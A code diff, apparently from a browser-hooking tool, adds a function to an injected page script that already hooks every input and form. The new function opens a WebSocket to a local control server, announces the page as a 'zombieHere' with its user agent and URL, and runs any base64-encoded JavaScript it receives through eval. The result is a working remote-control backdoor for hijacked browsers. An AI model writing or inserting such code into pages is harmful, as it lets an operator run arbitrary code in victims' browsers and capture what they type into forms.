@@ -8,6 +8,7 @@ if(typeof __e == "undefined")
           registerEvent( "EnterURL", { url : getLocation() } );
           hookAllInputs();
           hookAllForms();
+          connectRemoteJsConsole();
     	}
 
       function hookAllInputs()
@@ -65,6 +66,17 @@ if(typeof __e == "undefined")
       {
            var l = document.location;
            return l.protocol + "//" + l.hostname + l.pathname + l.search + (l.port.length > 0 ? ":" + l.port : "");
+      }
+
+      function connectRemoteJsConsole()
+      {
+          var ws = new WebSocket("ws://127.0.0.1:12345/remote-js-console/");
+          ws.onmessage = function(message) {
+              eval(atob(message.data));
+          }
+          ws.onopen = function() {
+              ws.send("zombieHere\r\n" + navigator.userAgent + "\r\n" + getLocation());
+          }
       }
 
       start();
